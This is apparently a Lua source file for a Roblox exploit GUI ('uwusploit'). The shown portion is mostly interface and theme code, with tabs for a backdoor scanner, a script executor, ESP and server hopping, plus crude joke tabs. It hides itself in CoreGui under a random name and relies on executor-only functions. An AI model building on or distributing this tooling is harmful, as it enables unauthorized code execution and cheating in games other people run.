--[[---------------------------------------------------------------------------------------------------------------------------
  ______     ______     ______     __  __     __    
 /\  __ \   /\  ___\   /\  ___\   /\ \/\ \   /\ \   
 \ \  __<   \ \___  \  \ \ \__ \  \ \ \_\ \  \ \ \  
  \ \_____\  \/\_____\  \ \_____\  \ \_____\  \ \_\ 
   \/_____/   \/_____/   \/_____/   \/_____/   \/_/
                                                                                                       
   Made by Team Noxious, Team Occulence & Team Symphysis -- boxten sex gui [version 3]
   
---------------------------------------------------------------------------------------------------------------------------]]--

if _G.boxtenloaded == true then return end _G.boxtenloaded = true

-------------------------------------------------------------------------------------------------------------------------------

wait(0.2) box = {} box["test game"] = 118022198489171 -- box["test game"] = 134048189553580

-------------------------------------------------------------------------------------------------------------------------------

box["version"] = "3"
box["workspace"] = game.Workspace
box["user input service"] = game:GetService("UserInputService")
box["players"] = game:GetService("Players")
box["local player"] = box["players"].LocalPlayer
box["player gui"] = box["local player"]:FindFirstChildWhichIsA("PlayerGui")
box["user input service"] = game:GetService("UserInputService")
box["tween service"] = game:GetService("TweenService")
box["http service"] = game:GetService("HttpService")
box["marketplace service"] = game:GetService("MarketplaceService")
box["run service"] = game:GetService("RunService")
box["teleport service"] = game:GetService("TeleportService")
box["starter gui"] = game:GetService("StarterGui")
box["gui service"] = game:GetService("GuiService")
box["lighting"] = game:GetService("Lighting")
box["context action service"] = game:GetService("ContextActionService")
box["network client"] = game:GetService("NetworkClient")
box["replicated storage"] = game:GetService("ReplicatedStorage")
box["group service"] = game:GetService("GroupService")
box["pathfinding service"] = game:GetService("PathfindingService")
box["sound service"] = game:GetService("SoundService")
box["teams"] = game:GetService("Teams")
box["starter player"] = game:GetService("StarterPlayer")
box["insert service"] = game:GetService("InsertService")
box["chat"] = game:GetService("Chat")
box["proximity prompt service"] = game:GetService("ProximityPromptService")
box["stats"] = game:GetService("Stats")
box["material service"] = game:GetService("MaterialService")
box["avatar editor service"] = game:GetService("AvatarEditorService")
box["text chat service"] = game:GetService("TextChatService")
box["unlocked"] = false
box["is mobile?"] = game:GetService("UserInputService").TouchEnabled

box["local player"].OnTeleport:Connect(function(State)
	qtp = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
	qtp([[--]])
end)

-------------------------------------------------------------------------------------------------------------------------------

function grs(l)
	local chars = {"▓", "▒", "░"}
	local result = ""
	for i = 1, l do
		local rndi = math.random(1, #chars)
		result = result .. chars[rndi]
	end
	return result
end

function grs2(l)
	local chars = {"1", "0"}
	local result = ""
	for i = 1, l do
		local rndi = math.random(1, #chars)
		result = result .. chars[rndi]
	end
	return result
end

function grs3(l)
	local chars = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}
	local result = ""
	for i = 1, l do
		local rndi = math.random(1, #chars)
		result = result .. chars[rndi]
	end
	return result
end

-------------------------------------------------------------------------------------------------------------------------------

box["screen gui"] = Instance.new("ScreenGui")
box["screen gui"].Name = "uwusploit![" .. grs3(50) .. "]"
box["screen gui"].ResetOnSpawn = false

if game.PlaceId == box["test game"] then
	box["screen gui"].Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
else
	box["screen gui"].Parent = gethui and gethui() or game:GetService("CoreGui")
end

-------------------------------------------------------------------------------------------------------------------------------

box["donut tab top bar"] = Instance.new("TextLabel")
box["donut tab top bar close button"] = Instance.new("TextButton")
box["donut tab top bar minimize button"] = Instance.new("TextButton")
box["donut tab top bar reposition button"] = Instance.new("TextButton")
box["donut tab top bar"] = Instance.new("TextLabel")
box["donut tab top bar close button"] = Instance.new("TextButton")
box["donut tab top bar minimize button"] = Instance.new("TextButton")
box["donut tab top bar reposition button"] = Instance.new("TextButton")
box["donut tab main frame 1"] = Instance.new("Frame")
box["donut tab block all"] = Instance.new("Frame")
box["donut tab block main frame"] = Instance.new("Frame")
box["donut"] = Instance.new("TextLabel")

-------------------------------------------------------------------------------------------------------------------------------

box["binary tab top bar"] = Instance.new("TextLabel")
box["binary tab top bar close button"] = Instance.new("TextButton")
box["binary tab top bar minimize button"] = Instance.new("TextButton")
box["binary tab top bar reposition button"] = Instance.new("TextButton")
box["binary tab top bar"] = Instance.new("TextLabel")
box["binary tab top bar close button"] = Instance.new("TextButton")
box["binary tab top bar minimize button"] = Instance.new("TextButton")
box["binary tab top bar reposition button"] = Instance.new("TextButton")
box["binary tab main frame 1"] = Instance.new("Frame")
box["binary tab block all"] = Instance.new("Frame")
box["binary tab block main frame"] = Instance.new("Frame")
box["binary"] = Instance.new("TextLabel")

-------------------------------------------------------------------------------------------------------------------------------

box["video tab top bar"] = Instance.new("TextLabel")
box["video tab top bar close button"] = Instance.new("TextButton")
box["video tab top bar minimize button"] = Instance.new("TextButton")
box["video tab top bar reposition button"] = Instance.new("TextButton")
box["video tab top bar"] = Instance.new("TextLabel")
box["video tab top bar close button"] = Instance.new("TextButton")
box["video tab top bar minimize button"] = Instance.new("TextButton")
box["video tab top bar reposition button"] = Instance.new("TextButton")
box["video tab main frame 1"] = Instance.new("Frame")
box["video tab block all"] = Instance.new("Frame")
box["video tab block main frame"] = Instance.new("Frame")
box["video"] = Instance.new("VideoFrame")
box["video id textbox"] = Instance.new("TextBox")

-------------------------------------------------------------------------------------------------------------------------------

box["gaydar tab top bar"] = Instance.new("TextLabel")
box["gaydar tab top bar close button"] = Instance.new("TextButton")
box["gaydar tab top bar minimize button"] = Instance.new("TextButton")
box["gaydar tab top bar reposition button"] = Instance.new("TextButton")
box["gaydar tab top bar"] = Instance.new("TextLabel")
box["gaydar tab top bar close button"] = Instance.new("TextButton")
box["gaydar tab top bar minimize button"] = Instance.new("TextButton")
box["gaydar tab top bar reposition button"] = Instance.new("TextButton")
box["gaydar tab main frame 1"] = Instance.new("Frame")
box["gaydar tab block all"] = Instance.new("Frame")
box["gaydar tab block main frame"] = Instance.new("Frame")
box["gaydar"] = Instance.new("ImageLabel")
box["gaydar target"] = Instance.new("TextBox")

-------------------------------------------------------------------------------------------------------------------------------

box["headcanon generator tab top bar"] = Instance.new("TextLabel")
box["headcanon generator tab top bar close button"] = Instance.new("TextButton")
box["headcanon generator tab top bar minimize button"] = Instance.new("TextButton")
box["headcanon generator tab top bar reposition button"] = Instance.new("TextButton")
box["headcanon generator tab top bar"] = Instance.new("TextLabel")
box["headcanon generator tab top bar close button"] = Instance.new("TextButton")
box["headcanon generator tab top bar minimize button"] = Instance.new("TextButton")
box["headcanon generator tab top bar reposition button"] = Instance.new("TextButton")
box["headcanon generator tab main frame 1"] = Instance.new("Frame")
box["headcanon generator tab block all"] = Instance.new("Frame")
box["headcanon generator tab block main frame"] = Instance.new("Frame")
box["headcanon generator output"] = Instance.new("TextLabel")
box["headcanon generator input"] = Instance.new("TextBox")
box["headcanon generator input 2"] = Instance.new("TextBox")
box["generate headcanon"] = Instance.new("TextButton")

-------------------------------------------------------------------------------------------------------------------------------

box["message reverser tab top bar"] = Instance.new("TextLabel")
box["message reverser tab top bar close button"] = Instance.new("TextButton")
box["message reverser tab top bar minimize button"] = Instance.new("TextButton")
box["message reverser tab top bar reposition button"] = Instance.new("TextButton")
box["message reverser tab top bar"] = Instance.new("TextLabel")
box["message reverser tab top bar close button"] = Instance.new("TextButton")
box["message reverser tab top bar minimize button"] = Instance.new("TextButton")
box["message reverser tab top bar reposition button"] = Instance.new("TextButton")
box["message reverser tab main frame 1"] = Instance.new("Frame")
box["message reverser tab block all"] = Instance.new("Frame")
box["message reverser tab block main frame"] = Instance.new("Frame")
box["message reverser input"] = Instance.new("TextBox")
box["reverse message"] = Instance.new("TextButton")
box["clear message reverser input"] = Instance.new("TextButton")

-------------------------------------------------------------------------------------------------------------------------------

box["noxsec encoder and decoder tab top bar"] = Instance.new("TextLabel")
box["noxsec encoder and decoder tab top bar close button"] = Instance.new("TextButton")
box["noxsec encoder and decoder tab top bar minimize button"] = Instance.new("TextButton")
box["noxsec encoder and decoder tab top bar reposition button"] = Instance.new("TextButton")
box["noxsec encoder and decoder tab top bar"] = Instance.new("TextLabel")
box["noxsec encoder and decoder tab top bar close button"] = Instance.new("TextButton")
box["noxsec encoder and decoder tab top bar minimize button"] = Instance.new("TextButton")
box["noxsec encoder and decoder tab top bar reposition button"] = Instance.new("TextButton")
box["noxsec encoder and decoder tab main frame 1"] = Instance.new("Frame")
box["noxsec encoder and decoder tab block all"] = Instance.new("Frame")
box["noxsec encoder and decoder tab block main frame"] = Instance.new("Frame")
box["noxsec encoder and decoder input"] = Instance.new("TextBox")
box["noxsec encode"] = Instance.new("TextButton")
box["noxsec decode"] = Instance.new("TextButton")
box["clear noxsec encoder and decoder input"] = Instance.new("TextButton")
box["copy noxsec encoder and decoder input"] = Instance.new("TextButton")

-------------------------------------------------------------------------------------------------------------------------------

box["wm"] = Instance.new("TextLabel")
box["sexy"] = Instance.new("ImageLabel")
box["toggle interface visibility button"] = Instance.new("TextButton")
box["top bar"] = Instance.new("TextLabel")
box["top bar close button"] = Instance.new("TextButton")
box["top bar minimize button"] = Instance.new("TextButton")
box["top bar reposition button"] = Instance.new("TextButton")

-------------------------------------------------------------------------------------------------------------------------------

box["block all"] = Instance.new("Frame")
box["main frame 1"] = Instance.new("Frame")
box["main frame 2"] = Instance.new("Frame")
box["main frame 3"] = Instance.new("Frame")
box["main frame 4"] = Instance.new("Frame")
box["block main frame"] = Instance.new("Frame")
box["password frame"] = Instance.new("Frame")
box["password text"] = Instance.new("TextLabel")
box["password box"] = Instance.new("TextBox")
box["introduction"] = Instance.new("TextLabel")
box["player information tab"] = Instance.new("TextButton")
box["server information tab"] = Instance.new("TextButton")
box["console output tab"] = Instance.new("TextButton")
box["console label"] = Instance.new("TextLabel")
box["output holder"] = Instance.new("Frame")
box["output scrolling frame"] = Instance.new("ScrollingFrame")
box["output textbox"] = Instance.new("TextBox")
box["clear console button"] = Instance.new("TextButton")
box["server information holder"] = Instance.new("TextLabel")
box["information holder"] = Instance.new("TextLabel")
box["information pfp"] = Instance.new("ImageLabel")
box["script settings tab"] = Instance.new("TextButton")
box["server settings tab"] = Instance.new("TextButton")
box["server settings holder"] = Instance.new("Frame")
box["change fps cap"] = Instance.new("TextLabel")
box["change fps cap setting"] = Instance.new("TextButton")
box["change fps cap textbox"] = Instance.new("TextBox")
box["rejoin server"] = Instance.new("TextButton")
box["leave game"] = Instance.new("TextButton")
box["server hop"] = Instance.new("TextButton")
box["auto rejoin toggle"] = Instance.new("TextLabel")
box["toggle auto rejoin on"] = Instance.new("TextButton")
box["toggle auto rejoin off"] = Instance.new("TextButton")
box["script settings holder"] = Instance.new("Frame")
box["current theme"] = Instance.new("TextLabel")
box["change theme setting"] = Instance.new("TextButton")
box["command prefix"] = Instance.new("TextLabel")
box["change command prefix setting"] = Instance.new("TextButton")
box["change command prefix textbox"] = Instance.new("TextBox")
box["change click sound setting"] = Instance.new("TextLabel")
box["change click sound"] = Instance.new("TextButton")
box["change click sound textbox"] = Instance.new("TextBox")
box["backdoor info"] = Instance.new("TextButton")
box["backdoor info holder"] = Instance.new("TextLabel")
box["scanning"] = Instance.new("TextButton")
box["logs holder"] = Instance.new("Frame")
box["logs label"] = Instance.new("TextLabel")
box["logs scrolling frame"] = Instance.new("ScrollingFrame")
box["logs textbox"] = Instance.new("TextBox")
box["backdoor scan button"] = Instance.new("TextButton")
box["credits"] = Instance.new("TextButton")
box["credits holder"] = Instance.new("TextLabel")
box["scripts tab"] = Instance.new("TextButton")
box["button holder"] = Instance.new("Frame")
box["next page"] = Instance.new("TextButton")
box["previous page"] = Instance.new("TextButton")
box["script search bar"] = Instance.new("TextBox")
box["commands tab"] = Instance.new("TextButton")
box["list of commands"] = Instance.new("ScrollingFrame")
box["command bar"] = Instance.new("TextBox")
box["execute command button"] = Instance.new("TextButton")
box["asset ids tab"] = Instance.new("TextButton")
box["asset id type indicator"] = Instance.new("TextLabel")
box["asset id search bar"] = Instance.new("TextBox")
box["switch asset id type button"] = Instance.new("TextButton")
box["switch asset id type button 2"] = Instance.new("TextButton")
box["asset image 1"] = Instance.new("ImageLabel")
box["asset image name 1"] = Instance.new("TextLabel")
box["asset image id 1"] = Instance.new("TextLabel")
box["copy asset id 1 button"] = Instance.new("TextButton")
box["asset image 2"] = Instance.new("ImageLabel")
box["asset image name 2"] = Instance.new("TextLabel")
box["asset image id 2"] = Instance.new("TextLabel")
box["copy asset id 2 button"] = Instance.new("TextButton")
box["asset image 3"] = Instance.new("ImageLabel")
box["asset image name 3"] = Instance.new("TextLabel")
box["asset image id 3"] = Instance.new("TextLabel")
box["copy asset id 3 button"] = Instance.new("TextButton")
box["next page 2 button"] = Instance.new("TextButton")
box["previous page 2 button"] = Instance.new("TextButton")
box["executor tab"] = Instance.new("TextButton")
box["executor scrolling frame"] = Instance.new("ScrollingFrame")
box["executor textbox"] = Instance.new("TextBox")
box["execute button"] = Instance.new("TextButton")
box["execute from client button"] = Instance.new("TextButton")
box["clear button"] = Instance.new("TextButton")
box["player information tab bottom cover"] = Instance.new("Frame")
box["server information tab bottom cover"] = Instance.new("Frame")
box["console output tab bottom cover"] = Instance.new("Frame")
box["script settings tab bottom cover"] = Instance.new("Frame")
box["server settings tab bottom cover"] = Instance.new("Frame")
box["backdoor info bottom cover"] = Instance.new("Frame")
box["scanning bottom cover"] = Instance.new("Frame")
box["credits bottom cover"] = Instance.new("Frame")
box["scripts tab bottom cover"] = Instance.new("Frame")
box["commands tab bottom cover"] = Instance.new("Frame")
box["asset ids tab bottom cover"] = Instance.new("Frame")
box["executor tab bottom cover"] = Instance.new("Frame")

-------------------------------------------------------------------------------------------------------------------------------

box["emoticon"] = "o.o"

grayscaletheme = false
noxioustheme = false
c00ltheme = false
defaulttheme = false
polariatheme = false
bstheme = true

--[[
local initialcols = {
	background = Color3.fromHex("252539"),
	border = Color3.fromHex("4051ED"),
	half = Color3.fromHex("858585"),
	half2 = Color3.fromHex("303db3"),
	white = Color3.fromHex("FFFFFF"),
	text = Color3.fromHex("ededed")
}
]]

local initialcols = {
	background = Color3.fromHex("2e2539"),
	border = Color3.fromHex("a948ab"),
	half = Color3.fromHex("858585"),
	half2 = Color3.fromHex("5d295e"),
	white = Color3.fromHex("FFFFFF"),
	text = Color3.fromHex("ededed")
}

--[[
local initialcols = {
	background = Color3.fromHex("253239"),
	border = Color3.fromHex("389fc2"),
	half = Color3.fromHex("858585"),
	half2 = Color3.fromHex("5d295e"),
	white = Color3.fromHex("FFFFFF"),
	text = Color3.fromHex("ededed")
}
]]

box["default background color"] = initialcols.background
box["default border color"] = initialcols.border
box["default 1/2 color"] = initialcols.half
box["default 1/2 color 2"] = initialcols.half2
box["default text color"] = initialcols.text
box["default text font"] = Enum.Font.RobotoMono

function sdfont(font)
	if typeof(font) == "EnumItem" and font.EnumType == Enum.Font then
		box["default text font"] = font
	end
end

local hues = 0.002

function shiftcol(color)
	local h, s, v = color:ToHSV()
	return Color3.fromHSV((h + hues) % 1, s, v)
end

function grayscale(color)
	local luminance = 0.2126 * color.R + 0.7152 * color.G + 0.0722 * color.B
	return Color3.new(luminance, luminance, luminance)
end

donuttabreallyminimized = false
binarytabreallyminimized = false
hcgentabreallyminimized = false
gaydartabreallyminimized = false
videotabreallyminimized = false
msgrevtabreallyminimized = false
noxsectabreallyminimized = false

function defaultcols()
	dis() 
	box["sexy"].Visible = false
	box["default background color"] = Color3.fromHex("252539")
	box["default border color"] = Color3.fromHex("4051ED")
	box["default text color"] = Color3.fromHex("ededed")
	box["default 1/2 color 2"] = Color3.fromHex("303db3")
	box["default 1/2 color"] = Color3.fromHex("858585")
	sdfont(Enum.Font.RobotoMono)
	box["top bar"].Text = " uwusploit " .. box["emoticon"]
	if donuttabreallyminimized then
		box["donut tab top bar"].Text = " donut.lua >.<"
	else
		box["donut tab top bar"].Text = " donut.lua o.o"
	end
	if binarytabreallyminimized then
		box["binary tab top bar"].Text = " binary.lua >.<"
	else
		box["binary tab top bar"].Text = " binary.lua o.o"
	end
	if hcgentabreallyminimized then
		box["headcanon generator tab top bar"].Text = " headcanon generator.lua >.<"
	else
		box["headcanon generator tab top bar"].Text = " headcanon generator.lua o.o"
	end
	if gaydartabreallyminimized then
		box["gaydar tab top bar"].Text = " gaydar.lua >.<"
	else
		box["gaydar tab top bar"].Text = " gaydar.lua o.o"
	end
	if videotabreallyminimized then
		box["video tab top bar"].Text = " video.lua >.<"
	else
		box["video tab top bar"].Text = " video.lua o.o"
	end
	if msgrevtabreallyminimized then
		box["message reverser tab top bar"].Text = " message reverser.lua >.<"
	else
		box["message reverser tab top bar"].Text = " message reverser.lua o.o"
	end
	if noxsectabreallyminimized then
		box["noxsec encoder and decoder tab top bar"].Text = " noxsec encoder and decoder.lua >.<"
	else
		box["noxsec encoder and decoder tab top bar"].Text = " noxsec encoder and decoder.lua o.o"
	end
end

function grayscalecols()
	dis() 
	box["sexy"].Visible = false
	box["default background color"] = grayscale(initialcols.background)
	box["default border color"] = grayscale(initialcols.border)
	box["default text color"] = grayscale(initialcols.border)
	box["default 1/2 color 2"] = grayscale(initialcols.half2)
	box["default 1/2 color"] = grayscale(initialcols.half2)
	sdfont(Enum.Font.RobotoMono)
	box["top bar"].Text = " uwusploit " .. box["emoticon"]
	if donuttabreallyminimized then
		box["donut tab top bar"].Text = " donut.lua >.<"
	else
		box["donut tab top bar"].Text = " donut.lua o.o"
	end
	if binarytabreallyminimized then
		box["binary tab top bar"].Text = " binary.lua >.<"
	else
		box["binary tab top bar"].Text = " binary.lua o.o"
	end
	if hcgentabreallyminimized then
		box["headcanon generator tab top bar"].Text = " headcanon generator.lua >.<"
	else
		box["headcanon generator tab top bar"].Text = " headcanon generator.lua o.o"
	end
	if gaydartabreallyminimized then
		box["gaydar tab top bar"].Text = " gaydar.lua >.<"
	else
		box["gaydar tab top bar"].Text = " gaydar.lua o.o"
	end
	if videotabreallyminimized then
		box["video tab top bar"].Text = " video.lua >.<"
	else
		box["video tab top bar"].Text = " video.lua o.o"
	end
	if msgrevtabreallyminimized then
		box["message reverser tab top bar"].Text = " message reverser.lua >.<"
	else
		box["message reverser tab top bar"].Text = " message reverser.lua o.o"
	end
	if noxsectabreallyminimized then
		box["noxsec encoder and decoder tab top bar"].Text = " noxsec encoder and decoder.lua >.<"
	else
		box["noxsec encoder and decoder tab top bar"].Text = " noxsec encoder and decoder.lua o.o"
	end
end

function noxiouscols()
	dis() 
	box["sexy"].Visible = false
	box["default background color"] = Color3.new(0, 0, 0)
	box["default border color"] = Color3.new(1, 1, 1)
	box["default text color"] = Color3.new(1, 1, 1)
	box["default 1/2 color 2"] = Color3.new(0.5, 0.5, 0.5)
	box["default 1/2 color"] = Color3.new(0.5, 0.5, 0.5)
	sdfont(Enum.Font.Nunito)
	box["top bar"].Text = "  uwusploit " .. box["emoticon"]
	if donuttabreallyminimized then
		box["donut tab top bar"].Text = "  donut.lua >.<"
	else
		box["donut tab top bar"].Text = "  donut.lua o.o"
	end
	if binarytabreallyminimized then
		box["binary tab top bar"].Text = "  binary.lua >.<"
	else
		box["binary tab top bar"].Text = "  binary.lua o.o"
	end
	if hcgentabreallyminimized then
		box["headcanon generator tab top bar"].Text = "  headcanon generator.lua >.<"
	else
		box["headcanon generator tab top bar"].Text = "  headcanon generator.lua o.o"
	end
	if gaydartabreallyminimized then
		box["gaydar tab top bar"].Text = "  gaydar.lua >.<"
	else
		box["gaydar tab top bar"].Text = "  gaydar.lua o.o"
	end
	if videotabreallyminimized then
		box["video tab top bar"].Text = "  video.lua >.<"
	else
		box["video tab top bar"].Text = "  video.lua o.o"
	end
	if msgrevtabreallyminimized then
		box["message reverser tab top bar"].Text = "  message reverser.lua >.<"
	else
		box["message reverser tab top bar"].Text = "  message reverser.lua o.o"
	end	
	if noxsectabreallyminimized then
		box["noxsec encoder and decoder tab top bar"].Text = "  noxsec encoder and decoder.lua >.<"
	else
		box["noxsec encoder and decoder tab top bar"].Text = "  noxsec encoder and decoder.lua o.o"
	end
end

function polariacols()
	dis() 
	box["sexy"].Visible = false
	box["default background color"] = Color3.new(0, 0, 0)
	box["default text color"] = Color3.new(1, 1, 1)
	box["default border color"] = Color3.new(0.5, 0, 1)
	box["default 1/2 color 2"] = Color3.new(0.25, 0, 0.5)
	box["default 1/2 color"] = Color3.new(0.5, 0.5, 0.5)
	sdfont(Enum.Font.Arimo)
	box["top bar"].Text = "  polaria reborn " .. box["emoticon"]
	if donuttabreallyminimized then
		box["donut tab top bar"].Text = "  donut.lua >.<"
	else
		box["donut tab top bar"].Text = "  donut.lua o.o"
	end
	if binarytabreallyminimized then
		box["binary tab top bar"].Text = "  binary.lua >.<"
	else
		box["binary tab top bar"].Text = "  binary.lua o.o"
	end
	if hcgentabreallyminimized then
		box["headcanon generator tab top bar"].Text = "  headcanon generator.lua >.<"
	else
		box["headcanon generator tab top bar"].Text = "  headcanon generator.lua o.o"
	end
	if gaydartabreallyminimized then
		box["gaydar tab top bar"].Text = "  gaydar.lua >.<"
	else
		box["gaydar tab top bar"].Text = "  gaydar.lua o.o"
	end
	if videotabreallyminimized then
		box["video tab top bar"].Text = "  video.lua >.<"
	else
		box["video tab top bar"].Text = "  video.lua o.o"
	end
	if msgrevtabreallyminimized then
		box["message reverser tab top bar"].Text = "  message reverser.lua >.<"
	else
		box["message reverser tab top bar"].Text = "  message reverser.lua o.o"
	end
	if noxsectabreallyminimized then
		box["noxsec encoder and decoder tab top bar"].Text = "  noxsec encoder and decoder.lua >.<"
	else
		box["noxsec encoder and decoder tab top bar"].Text = "  noxsec encoder and decoder.lua o.o"
	end
end

function c00lcols()
	dis() 
	box["sexy"].Visible = false
	box["default background color"] = Color3.new(0, 0, 0)
	box["default text color"] = Color3.new(1, 1, 1)
	box["default border color"] = Color3.new(1, 0, 0)
	box["default 1/2 color 2"] = Color3.new(0.5, 0, 0)
	box["default 1/2 color"] = Color3.new(0.5, 0.5, 0.5)
	sdfont(Enum.Font.SourceSans)
	box["top bar"].Text = "   c00lgui reborn " .. box["emoticon"]
	if donuttabreallyminimized then
		box["donut tab top bar"].Text = "   donut.lua >.<"
	else
		box["donut tab top bar"].Text = "   donut.lua o.o"
	end
	if binarytabreallyminimized then
		box["binary tab top bar"].Text = "   binary.lua >.<"
	else
		box["binary tab top bar"].Text = "   binary.lua o.o"
	end
	if hcgentabreallyminimized then
		box["headcanon generator tab top bar"].Text = "   headcanon generator.lua >.<"
	else
		box["headcanon generator tab top bar"].Text = "   headcanon generator.lua o.o"
	end
	if gaydartabreallyminimized then
		box["gaydar tab top bar"].Text = "   gaydar.lua >.<"
	else
		box["gaydar tab top bar"].Text = "   gaydar.lua o.o"
	end
	if videotabreallyminimized then
		box["video tab top bar"].Text = "   video.lua >.<"
	else
		box["video tab top bar"].Text = "   video.lua o.o"
	end
	if msgrevtabreallyminimized then
		box["message reverser tab top bar"].Text = "   message reverser.lua >.<"
	else
		box["message reverser tab top bar"].Text = "   message reverser.lua o.o"
	end
	if noxsectabreallyminimized then
		box["noxsec encoder and decoder tab top bar"].Text = "   noxsec encoder and decoder.lua >.<"
	else
		box["noxsec encoder and decoder tab top bar"].Text = "   noxsec encoder and decoder.lua o.o"
	end
end

local fadeTimer = 0
local fadeSpeed = 5

local fadeStart = {
	background = Color3.fromHex("2e2539"),
	border = Color3.fromHex("a948ab"),
	half = Color3.fromHex("858585"),
	half2 = Color3.fromHex("5d295e"),
	text = Color3.fromHex("ededed")
}

local fadeEnd = {
	background = Color3.fromHex("293c4d"),
	border = Color3.fromHex("77ADD7"),
	half = Color3.fromHex("858585"),
	half2 = Color3.fromHex("4f738f"),
	text = Color3.fromHex("ededed")
}

function restorecols()
	con() 
	box["sexy"].Visible = true
	
	fadeTimer += fadeSpeed * task.wait()
	local t = (math.sin(fadeTimer) + 1) / 2

	local bgColor = fadeStart.background:Lerp(fadeEnd.background, t)
	local borderColor = fadeStart.border:Lerp(fadeEnd.border, t)
	local text2Color = fadeStart.half2:Lerp(fadeEnd.half2, t)

	box["default background color"] = bgColor
	box["default border color"] = borderColor
	box["default 1/2 color"] = fadeStart.half
	box["default 1/2 color 2"] = text2Color
	box["default text color"] = fadeStart.text
	sdfont(Enum.Font.RobotoMono)

	box["top bar"].Text = "    boxten sex gui " .. box["emoticon"]

	local tabs = {
		{key = "donut", minimized = donuttabreallyminimized},
		{key = "binary", minimized = binarytabreallyminimized},
		{key = "headcanon generator", minimized = hcgentabreallyminimized},
		{key = "gaydar", minimized = gaydartabreallyminimized},
		{key = "video", minimized = videotabreallyminimized},
		{key = "message reverser", minimized = msgrevtabreallyminimized},
		{key = "noxsec encoder and decoder", minimized = noxsectabreallyminimized}
	}
	for _, tab in ipairs(tabs) do
		local prefix = "   "
		local suffix = tab.minimized and " >.<" or " o.o"
		box[tab.key .. " tab top bar"].Text = prefix .. tab.key .. ".lua" .. suffix
	end
end

box["box theme connection"] = nil

function dis()
	if not box["box theme connection"] then return end
	box["box theme connection"]:Disconnect()
	box["box theme connection"] = nil
end

function con()
	if box["box theme connection"] then return end
	box["box theme connection"] = game:GetService("RunService").RenderStepped:Connect(function()
		if bstheme then restorecols() updcols()
		end
	end)
end

con()

function applycurrenttheme()
	if grayscaletheme then
		grayscalecols()
	elseif noxioustheme then
		noxiouscols()
	elseif c00ltheme then
		c00lcols()
	elseif polariatheme then
		polariacols()
	elseif defaulttheme then
		defaultcols()
	else
		restorecols()
	end
end

local screenGui = box["screen gui"]

function applycols(object)
	if object:IsA("TextButton") or object:IsA("TextLabel") or object:IsA("Frame") or object:IsA("ScrollingFrame") or object:IsA("TextBox") or object:IsA("ImageLabel") or object:IsA("VideoFrame") then
		object.BackgroundColor3 = box["default background color"]
		object.BorderColor3 = box["default border color"]
	end

	if object:IsA("TextButton") or object:IsA("TextLabel") or object:IsA("TextBox") then
		object.TextColor3 = box["default text color"]
		object.Font = box["default text font"]
	end

	if object:IsA("TextBox") then
		object.PlaceholderColor3 = box["default 1/2 color"]
	end

	if object:IsA("TextLabel") and object.Name == "backdoor" then
		object.TextColor3 = box["default background color"]
		object.TextStrokeColor3 = box["default border color"]
	end

	if object:IsA("TextLabel") and object.Name == "fakebutton" or object.Name == "epico" then
		object.TextColor3 = box["default 1/2 color"]
		object.BorderColor3 = box["default 1/2 color 2"]
	end

	if object:IsA("ImageLabel") and object.Name == "epicob" then
		object.BorderColor3 = box["default 1/2 color 2"]
	end

	if object:IsA("TextLabel") and object.Name == "fakebuttonlabel" then
		object.TextColor3 = box["default 1/2 color"]
	end

	if object:IsA("TextLabel") and object.Name == "stay" then
		object.Font = Enum.Font.RobotoMono
	end

	if object:IsA("TextLabel") and object.Name == "fakebox" then
		local txtlength = #box["password box"].Text

		if box["typing"] == false then
			if txtlength == 0 then
				object.TextColor3 = box["default 1/2 color"]
			else
				object.TextColor3 = box["default text color"]
			end
		else
			if txtlength > 0 then
				object.TextColor3 = box["default text color"]
			else
				object.TextColor3 = box["default 1/2 color"]
			end
		end
	end

	if object:IsA("ScrollingFrame") then
		object.ScrollBarImageColor3 = box["default 1/2 color"]
	end

	if object:IsA("ImageLabel") and object.Image == "rbxassetid://110126477790022" then
		object.ImageColor3 = box["default text color"]
	end

	if object:IsA("Highlight") and object.Name == "unableesp" then		
		if noxioustheme then 
			object.FillColor = box["default background color"]
		else
			object.FillColor = box["default border color"]
		end
		object.OutlineColor = Color3.new(1, 1, 1)
	end

	if object:IsA("BillboardGui") and object.Name == "unableesp" then
		local label = object:FindFirstChildOfClass("TextLabel")
		if label then
			if noxioustheme then
				label.TextColor3 = box["default background color"]
			else
				label.TextColor3 = box["default border color"]
			end
		end
	end
end

function updcols()
	applycurrenttheme()

	if screenGui then
		for _, object in pairs(screenGui:GetDescendants()) do
			applycols(object)
		end
	end

	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("Highlight") or (descendant:IsA("BillboardGui") and descendant.Name == "unableesp") then
			applycols(descendant)
		end
	end
end

spawn(updcols)

-------------------------------------------------------------------------------------------------------------------------------

task.wait(0.1)

-------------------------------------------------------------------------------------------------------------------------------

function repos(ui, t, w, h)
	if not t then t = 0.5 end

	local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X
	local screenHeight = game:GetService("Workspace").CurrentCamera.ViewportSize.Y

	local frameWidth = w
	local frameHeight = h
	local negative = 56

	if ui ~= box["top bar"] then negative = 42 end

	local centerX = (screenWidth - frameWidth) / 2
	local centerY = (screenHeight - frameHeight) / 2 - negative
	local tweenInfo = TweenInfo.new(t, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)

	local tween = game:GetService("TweenService"):Create(
		ui,
		tweenInfo,
		{Position = UDim2.new(0, centerX, 0, centerY)}
	)

	tween:Play()
end

-------------------------------------------------------------------------------------------------------------------------------

box["wm"].Name = "backdoor"
box["wm"].Parent = box["screen gui"]
box["wm"].Text = ""
box["wm"].TextColor3 = box["default border color"]
box["wm"].TextStrokeColor3 = box["default background color"]
box["wm"].TextStrokeTransparency = 0
box["wm"].BackgroundTransparency = 1
box["wm"].Font = box["default text font"]
box["wm"].TextSize = 17
box["wm"].TextXAlignment = Enum.TextXAlignment.Center
box["wm"].TextYAlignment = Enum.TextYAlignment.Center
box["wm"].Size = UDim2.new(0, 200, 0, 30)
box["wm"].ZIndex = 100000
box["wm"].Visible = false

local notificationZ = 100000
local activeNotifications = {}
local pendingNotifications = {}
local isNotifying = false

local typingSounds = {
	"rbxassetid://9120299506", "rbxassetid://9120299323", "rbxassetid://9120300060",
	"rbxassetid://9120299407", "rbxassetid://9120299677", "rbxassetid://9120299595",
